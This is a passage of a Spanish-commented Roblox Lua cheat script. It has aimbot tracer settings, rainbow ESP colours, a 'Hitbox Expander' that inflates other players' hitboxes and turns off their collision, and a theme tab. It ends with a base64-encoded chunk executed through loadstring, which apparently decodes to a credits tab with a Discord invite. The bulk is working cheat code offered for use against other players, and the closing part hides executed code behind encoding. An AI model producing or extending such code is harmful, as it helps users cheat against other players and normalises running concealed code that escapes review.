    Name = "Mostrar Líneas (Tracers)",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.TracersEnabled = state
    end
})

AimbotTab:CreateColorPicker({
    Name = "Color de las Líneas (Tracers)",
    Color = AimbotSettings.TracerColor,
    Callback = function(val)
        AimbotSettings.TracerColor = val
    end
})

AimbotTab:CreateToggle({
    Name = "Apuntar a jugadores cercanos",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.OnlyClosePlayers = state
    end
})

AimbotTab:CreateSlider({
    Name = "Distancia",
    Range = {1, 300},
    Increment = 1,
    CurrentValue = AimbotSettings.CloseDistanceThreshold,
    Callback = function(val)
        if AimbotSettings.OnlyClosePlayers then
            AimbotSettings.CloseDistanceThreshold = val
        end
    end
})


local rainbowEnabled = false  -- Controlar el toggle único
local rainbowSpeed = 5  -- Velocidad del cambio de colores

local function GetRainbowColor()
    local time = tick() * rainbowSpeed
    return Color3.fromHSV(time % 1, 1, 1)
end


AimbotTab:CreateToggle({
    Name = "Rainbow",
    CurrentValue = false,
    Flag = "RainbowEffects",
    Callback = function(Value)
        rainbowEnabled = Value
    end
})

-- Crear un slider para la velocidad de cambio de color
AimbotTab:CreateSlider({
    Name = "Rainbow",
    Range = {0, 20},  -- Rango de velocidad
    Increment = 0.1,  -- Incremento de 1
    CurrentValue = rainbowSpeed,
    Callback = function(Value)
        rainbowSpeed = Value
    end
})

-- Cambiar colores en cada paso del RenderStepped
RunService.RenderStepped:Connect(function()
    if rainbowEnabled then
        -- FOV Rainbow
        AimbotSettings.FOVColor = GetRainbowColor()

        -- ESP Rainbow
        AimbotSettings.ESPColor = GetRainbowColor()

        -- Tracers Rainbow
        AimbotSettings.TracerColor = GetRainbowColor()
    end
end)


----Hitbox Espander---- 
---- Hitbox Expander Optimizado sin Noclip ----
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local PhysicsService = game:GetService("PhysicsService")

local HitboxTab = Window:CreateTab("Hitbox", nil)

getgenv().HitboxSize = 15
getgenv().HitboxTransparency = 0.9
getgenv().HitboxStatus = false
getgenv().TeamCheck = false

-- Crear grupo de colisión sin colisiones
pcall(function()
    PhysicsService:RegisterCollisionGroup("NoCollision")
    PhysicsService:CollisionGroupSetCollidable("NoCollision", "NoCollision", false)
end)

local function applyNoCollision(part)
    if part and part:IsA("BasePart") then
        PhysicsService:SetPartCollisionGroup(part, "NoCollision")
    end
end

local function applyNoCollisionToCharacter(character)
    for _, part in pairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            applyNoCollision(part)
        end
    end
end

local function updateHitboxes()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = v.Character.HumanoidRootPart
            local isEnemy = not getgenv().TeamCheck or (v.Team ~= Players.LocalPlayer.Team)

            local size = isEnemy and Vector3.new(getgenv().HitboxSize, getgenv().HitboxSize, getgenv().HitboxSize) or Vector3.new(2, 2, 1)
            local transparency = isEnemy and getgenv().HitboxTransparency or 1
            local color = isEnemy and BrickColor.new("Really black") or BrickColor.new("Medium stone grey")
            local material = isEnemy and Enum.Material.Neon or Enum.Material.Plastic

            -- Solo cambia si es necesario
            if hrp.Size ~= size then hrp.Size = size end
            if hrp.Transparency ~= transparency then hrp.Transparency = transparency end
            if hrp.BrickColor ~= color then hrp.BrickColor = color end
            if hrp.Material ~= material then hrp.Material = material end
            if hrp.CanCollide then hrp.CanCollide = false end

            applyNoCollisionToCharacter(v.Character)
        end
    end
end

local function resetHitboxes()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = v.Character.HumanoidRootPart
            if hrp.Size ~= Vector3.new(2, 2, 1) then hrp.Size = Vector3.new(2, 2, 1) end
            if hrp.Transparency ~= 1 then hrp.Transparency = 1 end
            if hrp.BrickColor ~= BrickColor.new("Medium stone grey") then hrp.BrickColor = BrickColor.new("Medium stone grey") end
            if hrp.Material ~= Enum.Material.Plastic then hrp.Material = Enum.Material.Plastic end
            if hrp.CanCollide then hrp.CanCollide = false end

            applyNoCollisionToCharacter(v.Character)
        end
    end
end

-- Toggle principal de Hitbox
local hitboxConnection
HitboxTab:CreateToggle({
    Name = "Hitbox Expander",
    CurrentValue = false,
    Flag = "HitboxToggle",
    Callback = function(state)
        getgenv().HitboxStatus = state

        if state then
            updateHitboxes()
            hitboxConnection = RunService.Heartbeat:Connect(function()
                if getgenv().HitboxStatus then
                    updateHitboxes()
                    task.wait(0.2) -- Ajusta la frecuencia según necesidad
                end
            end)
        else
            if hitboxConnection then
                hitboxConnection:Disconnect()
                hitboxConnection = nil
            end
            resetHitboxes()
        end
    end,
})

-- Toggle de Team Check
HitboxTab:CreateToggle({
    Name = "Team Checker",
    CurrentValue = false,
    Flag = "TeamCheckToggle",
    Callback = function(state)
        getgenv().TeamCheck = state
        if getgenv().HitboxStatus then
            updateHitboxes()
        end
    end,
})

-- Slider de tamaño del Hitbox
HitboxTab:CreateSlider({
    Name = "Tamaño del Hitbox",
    Range = {2, 500},
    Increment = 1,
    Suffix = "studs",
    CurrentValue = getgenv().HitboxSize,
    Flag = "HitboxSizeSlider",
    Callback = function(val)
        getgenv().HitboxSize = val
    end,
})

-- Slider de transparencia del Hitbox
HitboxTab:CreateSlider({
    Name = "Transparencia",
    Range = {0, 1},
    Increment = 0.05,
    CurrentValue = getgenv().HitboxTransparency,
    Flag = "HitboxTransparencySlider",
    Callback = function(val)
        getgenv().HitboxTransparency = val
    end,
})














 













----Temas---
themesTab = Window:CreateTab("temas", nil)
Section = themesTab:CreateSection("Cambia el tema")

-- Función para crear botones rápido
 function CreateThemeButton(name, theme)
    themesTab:CreateButton({
        Name = name,
        Callback = function()
            Window.ModifyTheme(theme)
            SaveTheme(theme)
        end
    })
end

CreateThemeButton("Black", "Default")
CreateThemeButton("AmberGlow", "AmberGlow")
CreateThemeButton("Amethyst", "Amethyst")
CreateThemeButton("Bloom", "Bloom")
CreateThemeButton("DarkBlue", "DarkBlue")
CreateThemeButton("Green", "Green")
CreateThemeButton("Light", "Light")
CreateThemeButton("Ocean", "Ocean")
CreateThemeButton("Serenity", "Serenity")

-- ColorPicker
ColorPicker = themesTab:CreateColorPicker({
    Name = "Color de fondo perzonalizado",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(color)
        Window.ModifyTheme({
            Background = color,
            Topbar = color,
            Border = color,
        })
        -- Opcionalmente podrías guardar colores también, pero sería más complicado
    end
})






----Creditos-----



-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Aquí va el script codificado en base64
local encoded = [[
LS0tLSBDcmVkaXRvcyAtLS0tCgpDcmVkaXRvc1RhYiA9IF9HLldpbmRvdzpDcmVhdGVUYWIoIkNyZWRpdG9zIiwgbmlsKQpDcmVkaXRvc1RhYjpDcmVhdGVTZWN0aW9uKCJDcmVhZG9yIikKCmxvY2FsIERpc2NvcmRJbnZpdGUgPSAiaHR0cHM6Ly9kaXNjb3JkLmdnL1pUVkM5NFptVloiCgpDcmVkaXRvc1RhYjpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJKb2FvX21vZHMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVzYXJyb2xsYWRvciBkZSBKbW9kcyBVbml2ZXJzYWwgeSBZb3V0dWJlciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBzZXRjbGlwYm9hcmQoRGlzY29yZEludml0ZSkKICAgICAgICBfRy5SYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJEaXNjb3JkISIsCiAgICAgICAgICAgIENvbnRlbnQgPSAiU2UgY29wacOzIGVsIGxpbmsgZGUgaW52aXRhY2nDs24sIG5vIG9sdmlkZXMgdmVyIHN1IGNhbmFsIiwKICAgICAgICAgICAgRHVyYXRpb24gPSA1LAogICAgICAgICAgICBJbWFnZSA9IDEzNDU4MDE3NDc4LAogICAgICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkgZW5kCiAgICAgICAgfSkKICAgIGVuZCwKfSkKCi0tIFRlc3RlcnMKQ3JlZGl0b3NUYWI6Q3JlYXRlU2VjdGlvbigiVGVzdGVycyIpCgoKQ3JlZGl0b3NUYWI6Q3JlYXRlUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gImVyamF6enkiLAogICAgQ29udGVudCA9ICJjaHVwZW4gcGljbyIKfSkKCkNyZWRpdG9zVGFiOkNyZWF0ZVBhcmFncmFwaCh7CiAgICBUaXRsZSA9ICJBbmRyM3NzZiIsCiAgICBDb250ZW50ID0gIlRvcCAxIGRlIHRvcnJlb24gY29haHVpbGEiCn0pCgpDcmVkaXRvc1RhYjpDcmVhdGVQYXJhZ3JhcGgoewogICAgVGl0bGUgPSAic2FudGlhZ282NDIyNiIsCiAgICBDb250ZW50ID0gIk5vIGFzaSBlc3RhIGJpZW4iCn0pCgotLSBDb2xhYm9yYWRvcmVzCkNyZWRpdG9zVGFiOkNyZWF0ZVNlY3Rpb24oIkNvbGFib3JhZG9yZXMiKQoKQ3JlZGl0b3NUYWI6Q3JlYXRlUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gIklORklOSVRZSEFDSyIsCiAgICBDb250ZW50ID0gIkplZmUgZGUgbG9zIGVuYW5vcyBhbGJpbm9zIPCfp5HigI3wn6ayIgp9KQoKCgpDcmVkaXRvc1RhYjpDcmVhdGVQYXJhZ3JhcGgoewogICAgVGl0bGUgPSAiSG9sYUNhcG9fOTQiLAogICAgQ29udGVudCA9ICJTaWdhbm1lIGVuIHJvYmxveCB4RCIKfSkgIAoKQ3JlZGl0b3NUYWI6Q3JlYXRlUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gIkVsIENhemFkb3IiLAogICAgQ29udGVudCA9ICJqbW9kcyBlcyBlbCBtZWpvciB4ZCIKfSkgIAoKQ3JlZGl0b3NUYWI6Q3JlYXRlUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gIk1hc2hh8J+SgPCflKUiLAogICAgQ29udGVudCA9ICJtZSBjb21pIGFsIG9zb28iCn0pICAKCkNyZWRpdG9zVGFiOkNyZWF0ZVBhcmFncmFwaCh7CiAgICBUaXRsZSA9ICJUdVRpb1BlcnVhbjAiLAogICAgQ29udGVudCA9ICJ4RCIKfSkgIAoKCgoKCgoKCgoKCgo=
]]

-- Decodificamos y ejecutamos
loadstring(base64decode(encoded))()




-----When haces tus momos en video
